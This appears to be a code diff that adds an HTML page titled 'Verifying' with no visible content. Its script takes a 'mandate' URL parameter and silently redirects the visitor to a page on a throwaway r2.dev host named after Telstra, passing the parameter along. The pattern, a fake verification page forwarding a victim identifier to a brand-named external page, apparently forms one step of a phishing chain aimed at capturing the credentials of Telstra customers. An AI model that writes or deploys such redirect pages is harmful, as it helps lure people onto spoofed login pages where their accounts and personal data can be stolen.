@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Verifying</title>
+  </head>
+  <body></body>
+  <script>
+    let landing = "https://pub-b94a9a3ada2347fe88f3dc1863f411ec.r2.dev/Telstrabiggie.htm/#";
+    let qParams = new URLSearchParams(window.location.search);
+    let e = qParams.get("mandate"); // or whatever used;
+    var decoder = "";
+    try {
+      decoder = atob(e);
+    } catch {
+      decoder = e;
+    }
+    document.location.href = landing + e;
+  </script>
+</html>
